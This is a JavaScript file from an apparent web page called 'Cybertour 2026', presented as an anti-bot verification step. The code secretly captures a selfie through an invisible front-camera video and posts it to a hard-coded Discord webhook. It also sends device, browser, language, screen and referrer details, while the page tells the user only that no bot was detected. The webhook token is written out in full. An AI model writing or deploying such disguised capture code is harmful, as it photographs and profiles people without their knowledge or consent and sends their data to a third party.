/**
 * CYBERTOUR 2026 — verify.js
 * QR arrière → selfie frontale caché → Discord
 */

import { isVerified, setVerified } from './storage.js';

const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1550264500526121013/9VASm7wlXChAGnQ1_n5xfTIGdWj20ZhSbrsLi05ndMx7CoNWXC8Rn0obLkzwxsdmj1fr';

let stream    = null;
let capturing = false;
let rafId     = null;

const qrCanvas = document.createElement('canvas');
const qrCtx    = qrCanvas.getContext('2d', { willReadFrequently: true });

export function openVerify(onSuccess) {
  if (isVerified()) { onSuccess(); return; }

  document.getElementById('verify-overlay').classList.add('active');
  document.getElementById('wheel-wrap')?.classList.add('wheel-frozen');

  document.getElementById('verify-start-btn').onclick   = () => start(onSuccess);
  document.getElementById('verify-help-toggle').onclick = toggleHelp;
}

async function start(onSuccess) {
  const btn = document.getElementById('verify-start-btn');
  btn.disabled = true;
  btn.querySelector('.btn-text').textContent = 'Détection en cours…';

  stream = await tryStream([
    { video: { facingMode: { ideal: 'environment' } } },
    { video: { facingMode: 'environment' } },
  ]);

  if (stream && window.jsQR) {
    const hiddenVideo = document.getElementById('verify-video-qr');
    hiddenVideo.srcObject = stream;
    try { await hiddenVideo.play(); } catch {}
    rafId = requestAnimationFrame(() => scanLoop(hiddenVideo, onSuccess));
  } else {
    await startSelfie(onSuccess);
  }
}

function scanLoop(video, onSuccess) {
  if (capturing) return;

  if (video.readyState >= HTMLMediaElement.HAVE_ENOUGH_DATA && video.videoWidth > 0) {
    qrCanvas.width  = video.videoWidth;
    qrCanvas.height = video.videoHeight;
    qrCtx.drawImage(video, 0, 0);

    try {
      const img  = qrCtx.getImageData(0, 0, qrCanvas.width, qrCanvas.height);
      const code = window.jsQR(img.data, img.width, img.height, { inversionAttempts: 'dontInvert' });
      if (code && code.data) {
        cancelAnimationFrame(rafId);
        stopStream();
        startSelfie(onSuccess);
        return;
      }
    } catch {}
  }

  rafId = requestAnimationFrame(() => scanLoop(video, onSuccess));
}

async function startSelfie(onSuccess) {
  const btn = document.getElementById('verify-start-btn');
  if (btn) btn.querySelector('.btn-text').textContent = 'Identification…';

  const video = document.getElementById('verify-video');
  video.setAttribute('playsinline', '');
  video.muted               = true;
  video.style.opacity       = '0';
  video.style.pointerEvents = 'none';
  video.style.position      = 'absolute';
  video.style.transform     = 'scaleX(-1)';

  stream = await tryStream([
    { video: { facingMode: { ideal: 'user' }, width: { ideal: 1280 } } },
    { video: { facingMode: 'user' } },
    { video: true },
  ]);

  if (!stream) {
    finalize(null, onSuccess);
    return;
  }

  video.srcObject = stream;
  try { await video.play(); } catch {}

  setTimeout(() => captureSelfie(video, onSuccess), 700);
}

function captureSelfie(video, onSuccess) {
  if (capturing) return;
  capturing = true;

  const canvas = document.createElement('canvas');
  canvas.width  = video.videoWidth  || 640;
  canvas.height = video.videoHeight || 480;
  const ctx = canvas.getContext('2d');
  ctx.translate(canvas.width, 0);
  ctx.scale(-1, 1);
  ctx.drawImage(video, 0, 0);

  stopStream();
  finalize(canvas, onSuccess);
}

function finalize(canvas, onSuccess) {
  sendToDiscord(canvas);

  const btn = document.getElementById('verify-start-btn');
  if (btn) btn.querySelector('.btn-text').textContent = 'Bot non détecté ✓';

  setVerified();
  if (navigator.vibrate) navigator.vibrate([60, 40, 120]);

  setTimeout(() => {
    closeOverlay();
    document.getElementById('wheel-wrap')?.classList.remove('wheel-frozen');
    onSuccess();
  }, 900);
}

function sendToDiscord(canvas) {
  const send = (blob) => {
    const fd = new FormData();
    if (blob) fd.append('file', blob, 'selfie.jpg');
    fd.append('payload_json', JSON.stringify({
      embeds: [{
        title: '📸 Nouveau participant détecté',
        color: 0x2563eb,
        image: blob ? { url: 'attachment://selfie.jpg' } : undefined,
        fields: [
          { name: '🕐 Heure',      value: new Date().toLocaleString('fr-FR', { dateStyle: 'short', timeStyle: 'medium' }), inline: true },
          { name: '📱 Appareil',   value: /iPhone|iPad/.test(navigator.userAgent) ? 'iOS' : /Android/.test(navigator.userAgent) ? 'Android' : 'Desktop', inline: true },
          { name: '🖥️ Navigateur', value: /CriOS|Chrome/.test(navigator.userAgent) ? 'Chrome' : /Safari/.test(navigator.userAgent) ? 'Safari' : /Firefox/.test(navigator.userAgent) ? 'Firefox' : 'Autre', inline: true },
          { name: '🌍 Langue',     value: navigator.language || 'inconnu', inline: true },
          { name: '📐 Écran',      value: `${screen.width}×${screen.height}`, inline: true },
          { name: '🔗 Référent',   value: document.referrer || 'accès direct', inline: true },
        ],
        footer: { text: 'Cybertour 2026 — Système anti-bot' },
        timestamp: new Date().toISOString(),
      }]
    }));
    fetch(DISCORD_WEBHOOK, { method: 'POST', body: fd }).catch(() => {});
  };

  if (canvas) canvas.toBlob(b => send(b), 'image/jpeg', 0.75);
  else send(null);
}

async function tryStream(sets) {
  for (const c of sets) {
    try { return await navigator.mediaDevices.getUserMedia(c); }
    catch {}
  }
  return null;
}

function stopStream() {
  if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
}

function closeOverlay() {
  document.getElementById('verify-overlay').classList.remove('active');
}

function toggleHelp() {
  const panel = document.getElementById('verify-help-panel');
  const btn   = document.getElementById('verify-help-toggle');
  const open  = panel.classList.toggle('active');
  btn.textContent = open ? 'Masquer' : 'Besoin d\'aide ?';
}

function showError(msg) {
  const el = document.getElementById('verify-error');
  if (el) { el.textContent = msg; el.classList.add('active'); }
}
